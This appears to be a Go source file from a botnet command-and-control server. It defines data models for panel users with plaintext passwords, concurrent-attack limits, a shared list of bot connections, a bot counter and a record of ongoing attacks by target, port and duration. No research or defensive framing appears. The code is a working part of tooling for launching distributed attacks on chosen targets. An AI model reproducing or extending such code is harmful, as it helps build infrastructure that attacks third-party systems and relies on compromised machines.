// models/models.go
package models

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
	"sync"
	"net"
	"cnc/config"
)

type UserInfo struct {
	Username string
	Password string
}

type AccInfo struct {
	Connected    bool
	Concurrents  int
	OngoingTimes []int64
}

type OngoingAttack struct {
    Name     string
    Target   string
    Duration time.Duration
    Port     string
}

var (
	BotCount     int
	BotCountLock sync.Mutex
	BotConns     []*net.Conn
	OngoingAttacks []OngoingAttack
)

func ReadUsersInfo() []UserInfo {
	var users []UserInfo

	file, err := os.Open(config.USERS_FILE)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return users
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			users = append(users, UserInfo{
				Username: strings.TrimSpace(parts[0]), 
				Password: strings.TrimSpace(parts[1]),
			})
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

	return users
}

func GetBotCount() int {
	BotCountLock.Lock()
	defer BotCountLock.Unlock()
	return BotCount
}

func IncrementBotCount() {
	BotCountLock.Lock()
	defer BotCountLock.Unlock()
	BotCount++
}

func DecrementBotCount() {
	BotCountLock.Lock()
	defer BotCountLock.Unlock()
	BotCount--
}

func RemoveOngoingAttack(attack OngoingAttack) {
    for i, a := range OngoingAttacks {
        if a == attack {
            OngoingAttacks = append(OngoingAttacks[:i], OngoingAttacks[i+1:]...)
            break
        }
    }
}